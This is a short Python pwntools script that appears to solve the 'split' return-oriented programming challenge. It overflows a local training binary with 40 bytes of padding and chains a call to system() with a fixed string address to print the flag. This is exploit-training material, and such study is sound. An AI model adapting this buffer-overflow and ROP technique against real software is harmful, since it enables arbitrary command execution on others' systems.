#!/bin/python3

from pwn import *

context.clear(arch='amd64')
filename = './split'

elf = ELF(filename)
io = process(filename)

r = ROP(elf)
r.raw(cyclic(40))
r.call(elf.plt['system'], [0x601060])
r.call('main')

payload = r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))
